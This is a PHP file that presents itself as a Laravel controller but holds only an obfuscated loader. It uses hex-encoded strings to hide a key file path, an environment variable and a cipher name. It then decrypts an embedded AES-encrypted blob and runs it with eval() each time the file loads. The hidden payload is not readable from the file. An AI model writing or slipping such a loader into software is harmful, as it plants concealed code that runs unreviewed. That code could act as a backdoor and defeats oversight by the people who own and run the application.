<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('KXa22B2RZuLYKxCnJ9JVzQ==');

$c=base64_decode(

'ZobfGIPFvkB8y7Kvoucgxtgt3ZnlG74q94d1eEqbtIFOwa8FjNRAR8cDR0vyRl67A3QHJ/09WsNn' .
'qpLBpQs2A9GSgRqm2JMbbFgiJTEgvKNdp1vERSSgPrZPG+M+idn8puoOfc9yDqBS4CHSh5Zzwsfo' .
'L083AFdpg8iwGc10F3HvL1YyelX79gJ5PH7gBA/a3CbrQmXqcR2bq91vtwm0Qo42REO0WYxxPokU' .
'f7Q1CAJoktKIBOITPS9RMBkgTynhJ9e+j9KD32pU+YiW1svjEg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

